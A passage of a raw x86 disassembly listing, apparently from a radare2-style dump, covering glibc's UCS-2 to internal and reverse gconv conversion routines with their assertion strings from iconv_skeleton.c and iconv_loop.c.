mov edx, dword [arg_14h]
mov eax, dword [arg_10h]
cmp edi, edx
mov dword [eax], edx
jae 0x805b491
movzx eax, byte [ebx]
inc ebx
mov byte [esi + ecx + 4], al
inc ecx
cmp ebx, dword [arg_14h]
jb 0x805b483
mov eax, 7
jmp 0x805b13b
mov dword [var_ch], str.__gconv_transform_ucs2_internal
mov dword [var_8h], 0x22e
mov dword [var_4h], str..._iconv_skeleton.c
mov dword [esp], str.outbufstart____void__0_
jmp 0x805b2fd
mov ebx, dword [arg_18h]
mov ecx, dword [ebx]
jmp 0x805b01e
mov eax, dword [arg_18h]
test eax, eax
jne 0x805b53b
mov edx, dword [arg_ch]
xor esi, esi
mov eax, dword [edx + 0x14]
mov dword [eax], 0
mov dword [eax + 4], 0
test byte [edx + 8], 1
jne 0x805b279
mov eax, dword [var_28h]
mov dword [esp], eax
call fcn.08083520
mov edx, dword [arg_24h]
mov dword [var_18h], ebx
mov eax, dword [var_24h]
mov ebx, dword [arg_1ch]
mov dword [var_sp_10h], 0
mov dword [var_ch], 0
mov dword [var_8h], 0
mov dword [var_sp_1ch], edx
mov dword [var_4h], eax
mov edx, dword [var_20h]
mov dword [var_sp_14h], ebx
mov dword [esp], edx
call dword [var_28h]
mov esi, eax
jmp 0x805b279
mov dword [var_ch], str.__gconv_transform_ucs2_internal
mov dword [var_8h], 0x19f
jmp 0x805b4ab
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x70
mov dword [var_38h], 0
mov edx, dword [arg_ch]
mov eax, dword [arg_8h]
mov ebx, dword [arg_20h]
add edx, 0x24
add eax, 0x3c
mov dword [var_34h], edx
mov dword [var_30h], eax
mov eax, dword [arg_ch]
mov eax, dword [eax + 8]
test al, 1
mov dword [var_58h], eax
mov dword [var_3ch], eax
jne 0x805b58e
mov edx, dword [var_30h]
mov edx, dword [edx + 0x14]
mov dword [var_38h], edx
test ebx, ebx
jne 0x805bc09
mov ebx, dword [arg_10h]
mov eax, dword [arg_18h]
mov ebx, dword [ebx]
test eax, eax
mov dword [var_5ch], ebx
mov ecx, ebx
jne 0x805bbff
mov eax, dword [arg_ch]
mov edx, dword [eax]
mov eax, dword [arg_ch]
mov edi, dword [arg_1ch]
mov dword [var_48h], 0
mov esi, dword [arg_24h]
mov dword [var_14h], edx
mov dword [var_10h], 0
mov eax, dword [eax + 4]
test edi, edi
mov dword [var_40h], eax
lea eax, [var_10h]
cmove eax, dword [var_48h]
test esi, esi
mov dword [var_48h], eax
je 0x805b702
mov ebx, dword [arg_ch]
mov esi, dword [ebx + 0x14]
mov eax, dword [esi]
and eax, 7
je 0x805b702
mov ebx, dword [arg_18h]
test ebx, ebx
jne 0x805bbdb
xor ebx, ebx
mov dword [var_50h], 0
mov dword [var_20h], ecx
cmp dword [arg_18h], eax
mov dword [var_bp_1ch], edx
jae 0x805b629
lea edx, [var_bp_18h]
movzx eax, byte [ebx + esi + 4]
mov byte [ebx + edx], al
mov eax, dword [esi]
inc ebx
and eax, 7
cmp ebx, eax
jb 0x805b617
mov ecx, dword [var_20h]
mov eax, ecx
sub eax, ebx
add eax, 4
cmp eax, dword [arg_14h]
ja 0x805bbaf
mov eax, dword [var_bp_1ch]
mov edx, 5
add eax, 2
cmp eax, dword [var_40h]
ja 0x805b6e7
lea edx, [var_bp_18h]
mov eax, ecx
inc ecx
mov dword [var_20h], ecx
movzx eax, byte [eax]
mov byte [edx + ebx], al
inc ebx
cmp ebx, 3
ja 0x805b66d
mov ecx, dword [var_20h]
cmp ecx, dword [arg_14h]
jb 0x805b653
lea eax, [edx + ebx]
mov ecx, edx
mov dword [var_20h], edx
mov edx, dword [var_bp_18h]
mov dword [var_4ch], eax
cmp edx, 0xffff
ja 0x805bb01
lea eax, [edx - 0xd800]
cmp eax, 0x7ff
jbe 0x805bad5
mov eax, dword [var_bp_1ch]
mov word [eax], dx
add eax, 2
mov dword [var_bp_1ch], eax
lea ecx, [var_14h]
mov dword [var_20h], ecx
lea eax, [var_bp_18h]
cmp ecx, eax
je 0x805ba6a
mov eax, ecx
lea edx, [var_bp_18h]
mov ecx, dword [esi]
sub eax, edx
mov edx, ecx
and edx, 7
cmp eax, edx
jle 0x805ba46
mov ebx, dword [arg_10h]
sub eax, edx
and ecx, 0xfffffff8
mov dword [var_50h], 0
mov dword [esi], ecx
add dword [ebx], eax
mov eax, dword [var_bp_1ch]
mov dword [var_14h], eax
mov edx, dword [var_50h]
test edx, edx
mov eax, edx
jne 0x805b849
mov ebx, dword [arg_ch]
mov eax, dword [arg_10h]
mov ebx, dword [ebx + 8]
mov eax, dword [eax]
mov dword [var_58h], ebx
mov dword [var_5ch], eax
mov ebx, dword [var_5ch]
mov eax, dword [arg_14h]
mov dword [var_54h], 4
mov edx, dword [var_14h]
cmp ebx, eax
mov dword [var_28h], ebx
mov ecx, ebx
mov dword [var_44h], edx
mov dword [var_24h], edx
je 0x805ba3e
mov edi, edx
lea esi, [ecx + 4]
cmp esi, dword [arg_14h]
ja 0x805ba32
lea ebx, [edi + 2]
cmp ebx, dword [var_40h]
ja 0x805ba26
mov edx, dword [ecx]
cmp edx, 0xffff
ja 0x805b975
lea eax, [edx - 0xd800]
cmp eax, 0x7ff
jbe 0x805b94a
mov word [edi], dx
mov dword [var_24h], ebx
mov edi, ebx
mov ecx, esi
mov dword [var_28h], ecx
cmp ecx, dword [arg_14h]
jne 0x805b727
mov edx, dword [arg_10h]
mov esi, dword [var_54h]
mov dword [edx], ecx
mov dword [var_14h], edi
mov eax, dword [arg_18h]
test eax, eax
jne 0x805b940
mov eax, dword [arg_ch]
mov ebx, dword [eax + 0x20]
test ebx, ebx
je 0x805b7a2
mov eax, dword [ebx + 4]
test eax, eax
jne 0x805b90c
mov ebx, dword [ebx + 0x10]
test ebx, ebx
jne 0x805b790
mov edx, dword [arg_ch]
inc dword [edx + 0xc]
test byte [edx + 8], 1
jne 0x805b8f7
mov ebx, dword [var_44h]
cmp dword [var_14h], ebx
jbe 0x805b821
mov eax, dword [edx]
mov dword [var_2ch], eax
mov eax, dword [var_38h]
mov dword [esp], eax
call fcn.08083520
mov eax, dword [var_14h]
mov edx, dword [arg_24h]
mov dword [var_18h], 0
mov ebx, dword [arg_1ch]
mov dword [var_sp_10h], 0
mov dword [var_ch], eax
mov dword [var_1ch], edx
lea eax, [var_2ch]
mov dword [var_8h], eax
mov edx, dword [var_30h]
mov dword [var_sp_14h], ebx
mov eax, dword [var_34h]
mov dword [esp], edx
mov dword [var_4h], eax
call dword [var_38h]
cmp eax, 4
mov ecx, eax
je 0x805b8de
mov edx, dword [var_2ch]
mov eax, dword [var_14h]
cmp edx, eax
jne 0x805b8d0
mov esi, ecx
test esi, esi
jne 0x805b840
mov ebx, dword [arg_ch]
mov edx, dword [arg_10h]
mov eax, dword [ebx]
mov dword [var_14h], eax
mov edx, dword [edx]
mov eax, dword [ebx + 8]
mov dword [var_5ch], edx
mov dword [var_58h], eax
jmp 0x805b702
mov eax, dword [arg_24h]
test eax, eax
jne 0x805b851
mov eax, esi
add esp, 0x70
pop ebx
pop esi
pop edi
leave
ret
cmp esi, 7
jne 0x805b847
mov ebx, dword [arg_10h]
mov eax, dword [arg_14h]
mov ebx, dword [ebx]
sub eax, ebx
mov dword [var_5ch], ebx
cmp eax, 3
jg 0x805b8ac
xor ecx, ecx
mov eax, dword [arg_14h]
cmp dword [var_5ch], eax
jae 0x805b89b
mov ebx, dword [arg_ch]
mov eax, dword [var_5ch]
mov edx, dword [ebx + 0x14]
inc eax
mov ebx, dword [arg_10h]
mov dword [ebx], eax
mov ebx, dword [var_5ch]
movzx eax, byte [ebx]
mov byte [ecx + edx + 4], al
mov ebx, dword [arg_14h]
mov edx, dword [arg_10h]
inc ecx
mov eax, dword [edx]
cmp eax, ebx
mov dword [var_5ch], eax
jb 0x805b872
mov eax, dword [arg_ch]
mov edx, dword [eax + 0x14]
mov eax, dword [edx]
and eax, 0xfffffff8
or eax, ecx
mov dword [edx], eax
jmp 0x805b847
mov dword [var_ch], str.__gconv_transform_internal_ucs2
mov dword [var_8h], 0x313
mov dword [var_4h], str..._iconv_skeleton.c
mov dword [esp], str.inend___inptrp___4
call fcn.0805efc0
mov ebx, dword [arg_10h]
sub eax, edx
add eax, eax
sub dword [ebx], eax
jmp 0x805b81f
cmp dword [var_54h], 5
jne 0x805b821
mov edx, dword [arg_ch]
xor esi, esi
mov eax, dword [edx]
mov dword [var_14h], eax
jmp 0x805b821
mov eax, dword [var_14h]
mov ebx, dword [arg_ch]
mov edx, dword [arg_1ch]
mov dword [ebx], eax
mov eax, dword [var_10h]
add dword [edx], eax
jmp 0x805b840
mov dword [esp], eax
call fcn.08083520
mov edx, dword [var_44h]
mov eax, dword [var_14h]
mov dword [var_ch], edx
mov dword [var_sp_10h], eax
mov edx, dword [arg_10h]
mov eax, dword [edx]
mov dword [var_8h], eax
mov eax, dword [var_5ch]
mov dword [var_4h], eax
mov eax, dword [ebx + 0xc]
mov dword [esp], eax
call dword [ebx + 4]
jmp 0x805b79b
mov ebx, dword [arg_18h]
mov dword [ebx], edi
jmp 0x805b847
mov eax, dword [var_48h]
mov dword [var_54h], 6
test eax, eax
je 0x805b770
test byte [var_58h], 2
je 0x805b770
mov eax, dword [var_48h]
mov ecx, esi
mov dword [var_28h], esi
inc dword [eax]
jmp 0x805b76b
shr edx, 7
cmp edx, 0x1c00
je 0x805b766
mov edx, dword [var_48h]
mov dword [var_54h], 6
test edx, edx
je 0x805b770
mov edx, dword [arg_ch]
mov ebx, dword [edx + 0x20]
test ebx, ebx
je 0x805ba04
lea edi, [var_24h]
lea esi, [var_28h]
mov eax, dword [ebx]
mov dword [esp], eax
call fcn.08083520
mov edx, dword [arg_14h]
mov eax, dword [var_48h]
mov dword [var_18h], edi
mov dword [var_sp_10h], esi
mov dword [var_sp_14h], edx
mov dword [var_1ch], eax
mov edx, dword [arg_10h]
mov eax, dword [edx]
mov edx, dword [arg_8h]
mov dword [var_ch], eax
mov eax, dword [ebx + 0xc]
mov dword [esp], edx
mov dword [var_8h], eax
mov eax, dword [arg_ch]
mov dword [var_4h], eax
call dword [ebx]
cmp eax, 6
mov dword [var_54h], eax
jne 0x805b9f4
mov ebx, dword [ebx + 0x10]
test ebx, ebx
jne 0x805b9a6
cmp dword [var_54h], 6
mov ecx, dword [var_28h]
mov edi, dword [var_24h]
jne 0x805b76b
mov eax, dword [var_48h]
test eax, eax
je 0x805b770
test byte [var_58h], 2
je 0x805b770
mov ebx, dword [var_48h]
add ecx, 4
inc dword [ebx]
jmp 0x805b768
mov dword [var_54h], 5
jmp 0x805b770
mov dword [var_54h], 7
jmp 0x805b770
mov edi, dword [var_24h]
jmp 0x805b770
mov dword [var_ch], str.internal_ucs2_loop_single
mov dword [var_8h], 0x1a9
mov dword [var_4h], str..._iconv_loop.c
mov dword [esp], str.inptr___bytebuf____state____count__7_
jmp 0x805b8cb
cmp dword [var_50h], 7
jne 0x805b6e4
lea eax, [ecx + 4]
cmp dword [var_4ch], eax
je 0x805bab1
mov eax, dword [var_4ch]
mov edx, dword [esi]
sub eax, ecx
and edx, 7
sub eax, edx
mov edx, dword [arg_10h]
add dword [edx], eax
cmp ecx, dword [var_4ch]
jae 0x805b6e4
mov eax, ecx
inc ecx
mov dword [var_20h], ecx
movzx eax, byte [eax]
mov byte [esi + ebx + 4], al
mov ecx, dword [var_20h]
inc ebx
cmp ecx, dword [var_4ch]
jb 0x805ba96
jmp 0x805b6e4
mov dword [var_ch], str.internal_ucs2_loop_single
mov dword [var_8h], 0x1bb
mov dword [var_4h], str..._iconv_loop.c
mov dword [esp], str.inend___bytebuf_4_
jmp 0x805b8cb
mov edi, dword [var_48h]
mov dword [var_50h], 6
test edi, edi
je 0x805b6aa
test byte [var_3ch], 2
je 0x805b6aa
mov edx, dword [var_48h]
lea ecx, [var_14h]
mov dword [var_20h], ecx
inc dword [edx]
jmp 0x805b6aa
shr edx, 7
cmp edx, 0x1c00
je 0x805b6a4
mov eax, dword [var_48h]
mov dword [var_50h], 6
test eax, eax
je 0x805b6aa
mov edx, dword [arg_ch]
mov edi, dword [edx + 0x20]
test edi, edi
je 0x805bb8d
mov eax, dword [edi]
mov dword [esp], eax
call fcn.08083520
mov eax, dword [var_48h]
lea edx, [var_bp_1ch]
mov dword [var_18h], edx
lea edx, [var_20h]
mov dword [var_sp_10h], edx
mov edx, dword [arg_10h]
mov dword [var_1ch], eax
mov eax, dword [var_4ch]
mov dword [var_sp_14h], eax
mov eax, dword [edx]
mov edx, dword [arg_8h]
mov dword [var_ch], eax
mov eax, dword [edi + 0xc]
mov dword [esp], edx
mov dword [var_8h], eax
mov eax, dword [arg_ch]
mov dword [var_4h], eax
call dword [edi]
cmp eax, 6
mov dword [var_50h], eax
jne 0x805bb80
mov edi, dword [edi + 0x10]
test edi, edi
jne 0x805bb2c
cmp dword [var_50h], 6
mov ecx, dword [var_20h]
jne 0x805b6aa
mov eax, dword [var_48h]
test eax, eax
je 0x805b6aa
test byte [var_3ch], 2
je 0x805b6aa
mov eax, dword [var_48h]
add ecx, 4
inc dword [eax]
jmp 0x805b6a7
mov edx, dword [arg_14h]
mov eax, dword [arg_10h]
cmp ecx, edx
mov dword [eax], edx
jae 0x805bbd1
mov eax, ecx
inc ecx
mov dword [var_20h], ecx
movzx eax, byte [eax]
mov byte [esi + ebx + 4], al
mov ecx, dword [var_20h]
inc ebx
cmp ecx, dword [arg_14h]
jb 0x805bbbb
mov edx, 7
jmp 0x805b6e7
mov dword [var_ch], str.__gconv_transform_internal_ucs2
mov dword [var_8h], 0x22e
mov dword [var_4h], str..._iconv_skeleton.c
mov dword [esp], str.outbufstart____void__0_
jmp 0x805b8cb
mov ebx, dword [arg_18h]
mov edx, dword [ebx]
jmp 0x805b5b0
mov eax, dword [arg_18h]
test eax, eax
jne 0x805bc7b
mov edx, dword [arg_ch]
xor esi, esi
mov eax, dword [edx + 0x14]
mov dword [eax], 0
mov dword [eax + 4], 0
test byte [edx + 8], 1
jne 0x805b847
mov eax, dword [var_38h]
mov dword [esp], eax
call fcn.08083520
mov edx, dword [arg_24h]
mov dword [var_18h], ebx
mov eax, dword [var_34h]
mov ebx, dword [arg_1ch]
mov dword [var_sp_10h], 0
mov dword [var_ch], 0
mov dword [var_8h], 0
mov dword [var_1ch], edx
mov dword [var_4h], eax
mov edx, dword [var_30h]
mov dword [var_sp_14h], ebx
mov dword [esp], edx
call dword [var_38h]
mov esi, eax
jmp 0x805b847
mov dword [var_ch], str.__gconv_transform_internal_ucs2
mov dword [var_8h], 0x19f
jmp 0x805bbeb
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x68
mov dword [var_28h], 0
mov edx, dword [arg_ch]
mov eax, dword [arg_8h]
mov ebx, dword [arg_20h]
add edx, 0x24
add eax, 0x3c
mov dword [var_24h], edx
mov dword [var_20h], eax
mov eax, dword [arg_ch]
mov edx, dword [eax + 8]
test dl, 1
mov dword [var_2ch], edx
jne 0x805bccc
mov eax, dword [var_20h]
mov eax, dword [eax + 0x14]
mov dword [var_28h], eax
test ebx, ebx
jne 0x805c1a3
mov ebx, dword [arg_10h]
mov eax, dword [arg_18h]
mov ebx, dword [ebx]
test eax, eax
mov dword [var_54h], ebx
mov edi, ebx
jne 0x805c199
mov eax, dword [arg_ch]
mov ecx, dword [eax]
mov eax, dword [arg_ch]
mov dword [var_38h], 0
mov esi, dword [arg_24h]
mov dword [var_14h], ecx
mov dword [var_10h], 0
mov eax, dword [eax + 4]
mov dword [var_30h], eax
mov eax, dword [arg_1ch]
test eax, eax
lea eax, [var_10h]
cmove eax, dword [var_38h]
test esi, esi
mov dword [var_38h], eax
je 0x805be2b
mov ebx, dword [arg_ch]
mov esi, dword [ebx + 0x14]
mov eax, dword [esi]
and eax, 7
je 0x805be2b
mov ebx, dword [arg_18h]
test ebx, ebx
jne 0x805c175
mov dword [var_44h], ecx
mov dword [var_40h], 0
mov ebx, edi
xor ecx, ecx
cmp dword [arg_18h], eax
jae 0x805bd66
lea edx, [var_16h]
movzx eax, byte [ecx + esi + 4]
mov byte [ecx + edx], al
mov eax, dword [esi]
inc ecx
and eax, 7
cmp ecx, eax
jb 0x805bd54
mov eax, edi
sub eax, ecx
add eax, 2
cmp eax, dword [arg_14h]
ja 0x805c151
mov eax, dword [var_44h]
mov edx, dword [var_30h]
add eax, 4
mov dword [var_48h], eax
cmp dword [var_48h], edx
mov eax, 5
ja 0x805be13
lea edx, [var_16h]
movzx eax, byte [ebx]
inc ebx
mov byte [edx + ecx], al
inc ecx
cmp ecx, 1
ja 0x805bda5
cmp ebx, dword [arg_14h]
jb 0x805bd93
lea eax, [edx + ecx]
mov ebx, edx
movzx edx, word [var_16h]
mov dword [var_3ch], eax
ror dx, 8
lea eax, [edx + 0x2800]
cmp ax, 0x7ff
jbe 0x805c12b
mov ebx, dword [var_44h]
movzx eax, dx
mov dword [ebx], eax
lea ebx, [var_14h]
mov eax, dword [var_48h]
mov dword [var_44h], eax
lea edx, [var_16h]
cmp ebx, edx
je 0x805c0c5
mov ecx, dword [esi]
mov eax, ebx
sub eax, edx
mov edx, ecx
and edx, 7
cmp eax, edx
jle 0x805c0a1
mov ebx, dword [arg_10h]
sub eax, edx
and ecx, 0xfffffff8
lea eax, [eax + edi]
mov dword [var_40h], 0
mov dword [esi], ecx
mov dword [ebx], eax
mov eax, dword [var_44h]
mov dword [var_14h], eax
mov eax, dword [var_40h]
test eax, eax
jne 0x805bf5b
mov ebx, dword [arg_ch]
mov esi, esi
mov eax, dword [arg_10h]
mov edx, dword [ebx + 8]
mov eax, dword [eax]
mov dword [var_54h], eax
mov esi, dword [var_54h]
mov eax, dword [arg_14h]
mov dword [var_4ch], 4
mov ebx, dword [var_14h]
cmp esi, eax
mov dword [var_34h], ebx
mov edi, ebx
je 0x805be90
and edx, 2
mov dword [var_50h], edx
lea esi, [esi]
lea ecx, [esi + 2]
cmp ecx, dword [arg_14h]
ja 0x805c095
lea ebx, [edi + 4]
cmp ebx, dword [var_30h]
ja 0x805c089
movzx edx, word [esi]
ror dx, 8
lea eax, [edx + 0x2800]
cmp ax, 0x7ff
jbe 0x805c063
movzx eax, dx
mov esi, ecx
mov dword [edi], eax
mov edi, ebx
cmp ecx, dword [arg_14h]
jne 0x805be50
lea esi, [esi]
mov ebx, dword [arg_10h]
mov dword [ebx], esi
mov esi, dword [var_4ch]
mov dword [var_14h], edi
mov eax, dword [arg_18h]
test eax, eax
jne 0x805c059
mov eax, dword [arg_ch]
mov ebx, dword [eax + 0x20]
test ebx, ebx
je 0x805bec2
mov eax, dword [ebx + 4]
test eax, eax
jne 0x805c025
mov ebx, dword [ebx + 0x10]
test ebx, ebx
jne 0x805beb0
mov edx, dword [arg_ch]
inc dword [edx + 0xc]
test byte [edx + 8], 1
jne 0x805c010
mov ebx, dword [var_34h]
cmp dword [var_14h], ebx
jbe 0x805bf41
mov eax, dword [edx]
mov dword [var_1ch], eax
mov eax, dword [var_28h]
mov dword [esp], eax
call fcn.08083520
mov eax, dword [var_14h]
mov edx, dword [arg_24h]
mov dword [var_18h], 0
mov ebx, dword [arg_1ch]
mov dword [var_sp_10h], 0
mov dword [var_ch], eax
mov dword [var_sp_1ch], edx
lea eax, [var_1ch]
mov dword [var_8h], eax
mov edx, dword [var_20h]
mov dword [var_sp_14h], ebx
mov eax, dword [var_24h]
mov dword [esp], edx
mov dword [var_4h], eax
call dword [var_28h]
cmp eax, 4
mov ecx, eax
je 0x805bff7
mov edx, dword [var_1ch]
mov eax, dword [var_14h]
cmp edx, eax
jne 0x805bfe2
mov esi, ecx
test esi, esi
jne 0x805bf52
mov ebx, dword [arg_ch]
mov eax, dword [ebx]
mov dword [var_14h], eax
jmp 0x805be20
mov eax, dword [arg_24h]
test eax, eax
jne 0x805bf63
mov eax, esi
add esp, 0x68
pop ebx
pop esi
pop edi
leave
ret
cmp esi, 7
jne 0x805bf59
mov edx, dword [arg_10h]
mov eax, dword [arg_14h]
mov edx, dword [edx]
sub eax, edx
mov dword [var_54h], edx
cmp eax, 3
jg 0x805bfbe
xor ecx, ecx
mov ebx, dword [arg_14h]
cmp dword [var_54h], ebx
jae 0x805bfad
mov eax, dword [arg_ch]
mov ebx, dword [arg_10h]
mov edx, dword [eax + 0x14]
mov eax, dword [var_54h]
inc eax
mov dword [ebx], eax
mov ebx, dword [var_54h]
movzx eax, byte [ebx]
mov byte [ecx + edx + 4], al
mov ebx, dword [arg_14h]
mov edx, dword [arg_10h]
inc ecx
mov eax, dword [edx]
cmp eax, ebx
mov dword [var_54h], eax
jb 0x805bf84
mov eax, dword [arg_ch]
mov edx, dword [eax + 0x14]
mov eax, dword [edx]
and eax, 0xfffffff8
or eax, ecx
mov dword [edx], eax
jmp 0x805bf59
mov dword [var_ch], str.__gconv_transform_ucs2reverse_internal
mov dword [var_8h], 0x313
mov dword [var_4h], str..._iconv_skeleton.c
mov dword [esp], str.inend___inptrp___4
call fcn.0805efc0
sub eax, edx
mov ebx, dword [arg_10h]
mov edx, eax
shr edx, 0x1f
add eax, edx
sar eax, 1
sub dword [ebx], eax
jmp 0x805bf3f
cmp dword [var_4ch], 5
jne 0x805bf41
mov edx, dword [arg_ch]
xor esi, esi
mov eax, dword [edx]
mov dword [var_14h], eax
jmp 0x805bf41
mov eax, dword [var_14h]
mov ebx, dword [arg_ch]
mov edx, dword [arg_1ch]
mov dword [ebx], eax
mov eax, dword [var_10h]
add dword [edx], eax
jmp 0x805bf52
mov dword [esp], eax
call fcn.08083520
mov edx, dword [var_34h]
mov eax, dword [var_14h]
mov dword [var_ch], edx
mov dword [var_sp_10h], eax
mov edx, dword [arg_10h]
mov eax, dword [edx]
mov dword [var_8h], eax
mov eax, dword [var_54h]
mov dword [var_4h], eax
mov eax, dword [ebx + 0xc]
mov dword [esp], eax
call dword [ebx + 4]
jmp 0x805bebb
mov edx, dword [arg_18h]
mov eax, edi
jmp 0x805bfba
mov eax, dword [var_38h]
test eax, eax
je 0x805c07d
mov eax, dword [var_50h]
test eax, eax
je 0x805c07d
mov edx, dword [var_38h]
mov esi, ecx
inc dword [edx]
jmp 0x805be88
mov dword [var_4ch], 6
jmp 0x805be90
mov dword [var_4ch], 5
jmp 0x805be90
mov dword [var_4ch], 7
jmp 0x805be90
mov dword [var_ch], str.ucs2reverse_internal_loop_single
mov dword [var_8h], 0x1a9
mov dword [var_4h], str..._iconv_loop.c
mov dword [esp], str.inptr___bytebuf____state____count__7_
jmp 0x805bfdd
cmp dword [var_40h], 7
jne 0x805be10
lea eax, [ebx + 2]
cmp dword [var_3ch], eax
je 0x805c107
mov eax, dword [var_3ch]
mov edx, dword [esi]
sub eax, ebx
and edx, 7
sub eax, edx
cmp ebx, dword [var_3ch]
mov edx, dword [arg_10h]
lea eax, [eax + edi]
mov dword [edx], eax
jae 0x805be10
movzx eax, byte [ebx]
inc ebx
mov byte [esi + ecx + 4], al
inc ecx
cmp ebx, dword [var_3ch]
jb 0x805c0f4
jmp 0x805be10
mov dword [var_ch], str.ucs2reverse_internal_loop_single
mov dword [var_8h], 0x1bb
mov dword [var_4h], str..._iconv_loop.c
mov dword [esp], str.inend___bytebuf_2_
jmp 0x805bfdd
mov edx, dword [var_38h]
test edx, edx
je 0x805c145
test byte [var_2ch], 2
je 0x805c145
mov edx, dword [var_38h]
lea ebx, [var_14h]
inc dword [edx]
jmp 0x805bdd6
mov dword [var_40h], 6
jmp 0x805bdd6
mov edx, dword [arg_14h]
mov eax, dword [arg_10h]
cmp edi, edx
mov dword [eax], edx
jae 0x805c16b
movzx eax, byte [ebx]
inc ebx
mov byte [esi + ecx + 4], al
inc ecx
cmp ebx, dword [arg_14h]
jb 0x805c15d
mov eax, 7
jmp 0x805be13
mov dword [var_ch], str.__gconv_transform_ucs2reverse_internal
mov dword [var_8h], 0x22e
mov dword [var_4h], str..._iconv_skeleton.c
mov dword [esp], str.outbufstart____void__0_
jmp 0x805bfdd
mov ebx, dword [arg_18h]
mov ecx, dword [ebx]
jmp 0x805bcee
mov eax, dword [arg_18h]
test eax, eax
jne 0x805c215
mov edx, dword [arg_ch]
xor esi, esi
mov eax, dword [edx + 0x14]
mov dword [eax], 0
mov dword [eax + 4], 0
test byte [edx + 8], 1
jne 0x805bf59
mov eax, dword [var_28h]
mov dword [esp], eax
call fcn.08083520
mov edx, dword [arg_24h]
mov dword [var_18h], ebx
mov eax, dword [var_24h]
mov ebx, dword [arg_1ch]
mov dword [var_sp_10h], 0
mov dword [var_ch], 0
mov dword [var_8h], 0
mov dword [var_sp_1ch], edx
mov dword [var_4h], eax
mov edx, dword [var_20h]
mov dword [var_sp_14h], ebx
mov dword [esp], edx
call dword [var_28h]
mov esi, eax
jmp 0x805bf59
mov dword [var_ch], str.__gconv_transform_ucs2reverse_internal
mov dword [var_8h], 0x19f
jmp 0x805c185
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x70
mov dword [var_38h], 0
mov edx, dword [arg_ch]
mov eax, dword [arg_8h]
mov ebx, dword [arg_20h]
add edx, 0x24
add eax, 0x3c
mov dword [var_34h], edx
mov dword [var_30h], eax
mov eax, dword [arg_ch]
mov eax, dword [eax + 8]
test al, 1
mov dword [var_5ch], eax
mov dword [var_3ch], eax
jne 0x805c26e
mov edx, dword [var_30h]
mov edx, dword [edx + 0x14]
mov dword [var_38h], edx
test ebx, ebx
jne 0x805c8f7
mov ebx, dword [arg_10h]
mov eax, dword [arg_18h]
mov ebx, dword [ebx]
test eax, eax
mov dword [var_58h], ebx
mov ecx, ebx
jne 0x805c8ed
mov eax, dword [arg_ch]
mov edx, dword [eax]
mov eax, dword [arg_ch]
mov edi, dword [arg_1ch]
mov dword [var_48h], 0
mov esi, dword [arg_24h]
mov dword [var_14h], edx
mov dword [var_10h], 0
mov eax, dword [eax + 4]
test edi, edi
mov dword [var_40h], eax
lea eax, [var_10h]
cmove eax, dword [var_48h]
test esi, esi
mov dword [var_48h], eax
je 0x805c3e6
mov ebx, dword [arg_ch]
mov esi, dword [ebx + 0x14]
mov eax, dword [esi]
and eax, 7
je 0x805c3e6
mov ebx, dword [arg_18h]
test ebx, ebx
jne 0x805c8c9
xor ebx, ebx
mov dword [var_50h], 0
mov dword [var_20h], ecx
cmp dword [arg_18h], eax
mov dword [var_bp_1ch], edx
jae 0x805c309
lea edx, [var_bp_18h]
movzx eax, byte [ebx + esi + 4]
mov byte [ebx + edx], al
mov eax, dword [esi]
inc ebx
and eax, 7
cmp ebx, eax
jb 0x805c2f7
mov ecx, dword [var_20h]
mov eax, ecx
sub eax, ebx
add eax, 4
cmp eax, dword [arg_14h]
ja 0x805c89d
mov eax, dword [var_bp_1ch]
mov edx, 5
add eax, 2
cmp eax, dword [var_40h]
ja 0x805c3cb
lea edx, [var_bp_18h]
mov eax, ecx
inc ecx
mov dword [var_20h], ecx
movzx eax, byte [eax]
mov byte [edx + ebx], al
inc ebx
cmp ebx, 3
ja 0x805c34d
mov ecx, dword [var_20h]
cmp ecx, dword [arg_14h]
jb 0x805c333
lea eax, [edx + ebx]
mov ecx, edx
mov dword [var_20h], edx
mov edx, dword [var_bp_18h]
mov dword [var_4ch], eax
cmp edx, 0xffff
ja 0x805c7ef
lea eax, [edx - 0xd800]
cmp eax, 0x7ff
jbe 0x805c7c6
mov eax, dword [var_bp_1ch]
ror dx, 8
mov word [eax], dx
add eax, 2
mov dword [var_bp_1ch], eax
lea ecx, [var_14h]
mov dword [var_20h], ecx
lea eax, [var_bp_18h]
cmp ecx, eax
je 0x805c75b
mov eax, ecx
lea edx, [var_bp_18h]
mov ecx, dword [esi]
sub eax, edx
mov edx, ecx
and edx, 7
cmp eax, edx
jle 0x805c737
mov ebx, dword [arg_10h]
sub eax, edx
and ecx, 0xfffffff8
mov dword [var_50h], 0
mov dword [esi], ecx
add dword [ebx], eax
mov eax, dword [var_bp_1ch]
mov dword [var_14h], eax
mov edx, dword [var_50h]
test edx, edx
mov eax, edx
jne 0x805c539
mov ebx, dword [arg_ch]
mov eax, dword [arg_10h]
mov ebx, dword [ebx + 8]
mov eax, dword [eax]
mov dword [var_5ch], ebx
mov dword [var_58h], eax
mov ebx, dword [var_58h]
mov eax, dword [arg_14h]
mov dword [var_54h], 4
mov edx, dword [var_14h]
cmp ebx, eax
mov dword [var_28h], ebx
mov ecx, ebx
mov dword [var_44h], edx
mov dword [var_24h], edx
je 0x805c72f
mov edi, edx
nop
lea esi, [esi]
lea ebx, [ecx + 4]
cmp ebx, dword [arg_14h]
ja 0x805c723
lea esi, [edi + 2]
cmp esi, dword [var_40h]
ja 0x805c717
mov edx, dword [ecx]
cmp edx, 0xffff
ja 0x805c666
lea eax, [edx - 0xd800]
cmp eax, 0x7ff
jbe 0x805c63e
mov eax, edx
mov dword [var_24h], esi
ror ax, 8
mov word [edi], ax
mov edi, esi
mov ecx, ebx
mov dword [var_28h], ecx
cmp ecx, dword [arg_14h]
jne 0x805c410
nop
mov edx, dword [arg_10h]
mov esi, dword [var_54h]
mov dword [edx], ecx
mov dword [var_14h], edi
mov eax, dword [arg_18h]
test eax, eax
jne 0x805c634
mov eax, dword [arg_ch]
mov ebx, dword [eax + 0x20]
test ebx, ebx
je 0x805c492
mov eax, dword [ebx + 4]
test eax, eax
jne 0x805c600
mov ebx, dword [ebx + 0x10]
test ebx, ebx
jne 0x805c480
mov edx, dword [arg_ch]
inc dword [edx + 0xc]
test byte [edx + 8], 1
jne 0x805c5e7
mov ebx, dword [var_44h]
cmp dword [var_14h], ebx
jbe 0x805c511
mov eax, dword [edx]
mov dword [var_2ch], eax
mov eax, dword [var_38h]
mov dword [esp], eax
call fcn.08083520
mov eax, dword [var_14h]
mov edx, dword [arg_24h]
